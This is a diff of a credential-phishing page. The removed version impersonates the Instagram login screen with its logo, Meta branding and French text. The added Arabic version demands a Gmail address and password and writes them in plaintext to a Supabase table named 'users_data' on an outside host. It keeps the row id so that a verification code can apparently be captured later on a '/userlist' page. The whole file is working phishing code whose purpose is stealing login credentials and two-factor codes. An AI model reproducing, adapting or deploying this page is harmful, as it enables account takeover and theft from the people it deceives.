@@ -1,96 +1,119 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram</title>
+  <title>تسجيل الدخول</title>
   <style>
-    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
-    body { background-color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-height: 100vh; padding: 20px 0; }
-    .lang-select { font-size: 13px; color: #65676b; margin-top: 10px; }
-    .container { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; padding: 0 20px; }
-    .logo { width: 60px; height: 60px; margin-bottom: 30px; }
-    form { width: 100%; }
-    .input-field { width: 100%; padding: 14px 16px; border: 1px solid #e0e0e0; border-radius: 12px; font-size: 14px; margin-bottom: 12px; outline: none; background-color: #fafafa; }
-    .input-field:focus { border-color: #a8a8a8; background-color: #fff; }
-    .btn-login { width: 100%; padding: 13px; background-color: #0064e0; color: white; border: none; border-radius: 20px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 6px; display: flex; justify-content: center; align-items: center; }
-    .error-msg { color: #ed4956; font-size: 12px; margin-bottom: 10px; display: none; text-align: center; }
-    .loading-box { display: none; flex-direction: column; align-items: center; margin-top: 15px; }
-    .spinner { width: 24px; height: 24px; border: 3px solid #f3f3f3; border-top: 3px solid #0064e0; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 8px; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .loading-text { font-size: 13px; color: #65676b; font-weight: 500; }
-    .forgot-pass { display: block; text-align: center; color: #1c2b33; font-size: 14px; font-weight: 500; margin-top: 16px; text-decoration: none; }
-    .footer { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; padding: 0 20px; }
-    .btn-signup { width: 100%; padding: 11px; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; border-radius: 20px; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 20px; }
-    .meta-logo { font-size: 13px; color: #0064e0; font-weight: bold; display: flex; align-items: center; gap: 4px; }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-card {
+      background: #ffffff;
+      border: 1px solid #dbdbdb;
+      padding: 30px;
+      width: 320px;
+      text-align: center;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+    h2 {
+      margin-bottom: 20px;
+      color: #262626;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      box-sizing: border-box;
+      background: #fafafa;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:disabled {
+      background-color: #b2dffc;
+    }
   </style>
+  <!-- مكتبة Supabase JS -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
-  <div class="lang-select">Français (France) ∨</div>
-
-  <div class="container">
-    <svg class="logo" viewBox="0 0 24 24" fill="none">
-      <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" fill="url(#ig-grad)"/>
-      <defs>
-        <radialGradient id="ig-grad" cx="30%" cy="107%" r="130%" fx="30%" fy="107%">
-          <stop offset="0%" stop-color="#fdf497"/><stop offset="5%" stop-color="#fdf497"/><stop offset="45%" stop-color="#fd5949"/><stop offset="60%" stop-color="#d6249f"/><stop offset="90%" stop-color="#285AEB"/>
-        </radialGradient>
-      </defs>
-    </svg>
-
-    <div id="errorMsg" class="error-msg">L'adresse doit se terminer par @gmail.com</div>
-
+  <div class="login-card">
+    <h2>تسجيل الدخول</h2>
     <form id="loginForm">
-      <input type="text" id="email" class="input-field" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
-      <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
-      <button type="submit" id="submitBtn" class="btn-login">
-        <span id="btnText">Se connecter</span>
-      </button>
+      <input type="email" id="email" placeholder="البريد الإلكتروني (@gmail.com)" required>
+      <input type="password" id="password" placeholder="كلمة السر" required>
+      <button type="submit" id="submitBtn">متابعة</button>
     </form>
-
-    <div id="loadingBox" class="loading-box">
-      <div class="spinner"></div>
-      <div class="loading-text">Vérification des données...</div>
-    </div>
-
-    <a href="#" class="forgot-pass">Mot de passe oublié ?</a>
-  </div>
-
-  <div class="footer">
-    <button class="btn-signup">Créer un nouveau compte</button>
-    <div class="meta-logo">∞ Meta</div>
   </div>
 
   <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
+    // إعداد الاتصال بـ Supabase
+    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtF...'; // قم بلصق مفتاح Publishable الكامل هنا
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
+    const form = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
-      const errorMsg = document.getElementById('errorMsg');
-      const submitBtn = document.getElementById('submitBtn');
-      const loadingBox = document.getElementById('loadingBox');
 
+      // التأكد من أن الإيميل ينتهي بـ @gmail.com
       if (!email.toLowerCase().endsWith('@gmail.com')) {
-        errorMsg.style.display = 'block';
+        alert('يرجى إدخال بريد إلكتروني ينتهي بـ @gmail.com');
         return;
       }
 
-      errorMsg.style.display = 'none';
       submitBtn.disabled = true;
-      submitBtn.style.opacity = '0.6';
-      loadingBox.style.display = 'flex';
+      submitBtn.innerText = 'جاري الإرسال...';
 
-      // حفظ الإيميل والباسورد مؤقتاً للذهاب لصفحة الكود
-      localStorage.setItem('temp_email', email);
-      localStorage.setItem('temp_password', password);
+      try {
+        // إدخال الإيميل وكلمة السر في جدول users_data
+        const { data, error } = await supabaseClient
+          .from('users_data')
+          .insert([{ email: email, password: password }])
+          .select();
 
-      setTimeout(function() {
-        window.location.href = '/userlist'; // التحويل للمسار الجديد
-      }, 3000);
+        if (error) {
+          console.error('Error inserting data:', error);
+          alert('حدث خطأ أثناء حفظ البيانات: ' + error.message);
+          submitBtn.disabled = false;
+          submitBtn.innerText = 'متابعة';
+        } else if (data && data.length > 0) {
+          // حفظ ID السطر المنشأ للاستفادة منه في إضافة الكود لاحقاً
+          localStorage.setItem('user_row_id', data[0].id);
+          // التحويل إلى صفحة إدخال الكود
+          window.location.href = '/userlist';
+        }
+      } catch (err) {
+        console.error('Unexpected error:', err);
+        alert('حدث خطأ غير متوقع!');
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'متابعة';
+      }
     });
   </script>
-
 </body>
 </html>
